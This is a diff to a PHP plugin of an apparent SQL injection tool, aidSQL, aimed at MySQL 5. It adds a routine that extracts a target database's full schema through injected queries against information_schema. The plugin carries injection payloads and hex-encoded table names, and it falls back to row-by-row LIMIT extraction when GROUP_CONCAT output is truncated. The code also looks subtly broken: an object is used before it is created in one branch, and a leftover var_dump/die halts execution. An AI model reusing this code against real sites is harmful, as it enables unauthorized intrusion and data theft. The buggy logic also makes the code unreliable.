@@ -14,6 +14,7 @@
 			private	$_currentRegisterStep		=	0;
 			private	$_fields							=	NULL;			//table fields
 			private	$_useConcat						=	FALSE;		//Concat values with a tag like <aidsql></aidsql>
+			private	$_groupConcatLength			=	1024;			//Default group concat character length
 			private	$_openTag						=	NULL;
 			private	$_closeTag						=	NULL;
 			private	$_fieldPayloads				=	array("","'", "%'","')","%')");
@@ -22,6 +23,7 @@
 			private	$_currFieldPayload			=	NULL;
 			private	$_currTerminatingPayload	=	NULL;
 			private	$_affectedDatabases			=	array("mysql5");
+			private	$_getCompleteSchema			=	TRUE;
 
 
 			public function getPluginName(){
@@ -85,17 +87,20 @@
 				
 			}
 
+
 			public function setEndingPayloads(Array $payloads){
 
 				$this->_endingPayloads	=	$payloads;
 
 			}
 
+
 			public function setCommentPayloads(Array $payloads){
 
 				$this->_commentPayloads	=	$payloads;
 
 			}
+
 
 			/**
 			*Checkout if the given URL by the HttpAdapter is vulnerable or not
@@ -248,13 +253,16 @@
 
 			}
 
+
 			public function setOpenTag($openTag){
 				$this->_openTag = $openTag;
 			}
 
+
 			public function setCloseTag($closeTag){
 				$this->_closeTag = $closeTag;
 			}
+
 
 			public function getOpenTag(){
 
@@ -268,6 +276,7 @@
 
 			}
 
+
 			public function getCloseTag(){
 
 				if(!empty($this->_closeTag)){
@@ -279,6 +288,7 @@
 				return $this->_closeTag;
 
 			}
+
 
 			private function tagConcat($string){
 
@@ -297,6 +307,23 @@
 
 				return $pre.$string.$post;
 
+			}
+
+			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
+			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
+			//This simple function will determine this according to the self::_groupConcatLength parameter (default 1024)
+
+			private function detectTruncatedData($string=NULL){
+
+				if(strlen($string) == $this->_groupConcatLength){
+
+					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
+					return TRUE;
+
+				}
+
+				return FALSE;
+			
 			}
 
 			public function setStep($step=10){
@@ -371,29 +398,100 @@
 
 			}
 
-			public function getTables(){
+			public function getSchema($complete=TRUE){
 
-				$select	= "GROUP_CONCAT(TABLE_NAME)";
-				$from		= "FROM information_schema.tables WHERE table_schema=DATABASE()";
+				$select	=	"GROUP_CONCAT(TABLE_NAME)";
+				$from		=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
 
-				return $this->execute($select,$from);
+				$tables	=	$this->execute($select,$from);
+
+				if($this->detectTruncatedData($tables)){	//We have to do 1 by 1 table retrieval :/ bigger foot print
+
+					$this->log("Performing table extraction one by one",2,"yellow");
+
+					$limit	=	1;
+
+					$dbSchema								=	new \aidSQL\core\DatabaseSchema();
+					$restoreTerminatingPayload			=	$this->_currTerminatingPayload;
+					$select									=	"TABLE_NAME";
+					$from										=	"FROM information_schema.tables WHERE table_schema=DATABASE()";
+
+					while($table	=	$this->execute($select,$from)){
+
+						$this->_currTerminatingPayload	=	"LIMIT ".$limit++.",1";
+
+						//Add the table and the columns of the table to the DatabaseSchema Object
+
+						$dbSchema->addTable($table,$this->getColumns($table));
+
+					}
+
+					$this->_currTerminatingPayload	=	$restoreTerminatingPayload;
+
+				}else{	//no data trunking, everything cool
+
+					$tables	=	explode(',',$tables);
+
+					foreach($tables as $table){
+
+						$dbSchema->addTable($table,$this->getColumns($table));
+
+					}
+
+				}
+
+
+				var_dump($dbSchema->getSchema());
+				die();
+				return $dbSchema;
+
 
 			}
 
 
-			public function getColumns(){
+			private function getColumns($table=NULL){
 
-				if(!isset($this->_table)){
-					throw(new \Exception("Table must be set in order to call this method"));
+				if(is_null($table)){
+
+					throw(new \Exception("ERROR: Table name cannot be empty when trying to fetch columns! (Please report bug)"));
+					return array();
+
 				}
 
-				$table = String::hexEncode($this->_table);
+				$table			=	\String::hexEncode($table);
 
-				$fieldInjection	= "COLUMN_NAME";
-				$tableInjection	= "FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";
+				$select			=	"GROUP_CONCAT(COLUMN_NAME)";
+				$from				=	"FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";
 
-				return $this->generateInjection($fieldInjection,$tableInjection);
+				$tableFields	=	$this->execute($select,$from);
+				
+				$this->log("Fetching table columns ...",0,"white");
 
+				if($this->detectTruncatedData($tableFields)){
+
+					$limit			=	1;
+					$select			=	"COLUMN_NAME";
+					$from				=	"FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=$table";
+
+					$tableFields					=	array();
+					$restoreTerminatingPayload	=	$this->_currTerminatingPayload;
+
+					while($field	=	$this->execute($select,$from)){
+
+						$this->_currTerminatingPayload	=	"LIMIT ".$limit++.",1";
+						$tableFields[]	=	$field;
+
+					}
+
+					$this->_currTerminatingPayload	=	$restoreTerminatingPayload;
+
+				}else{
+
+					$tableFields	=	explode(',',$tableFields);
+					
+				}
+
+				return $tableFields;
 
 			}
 
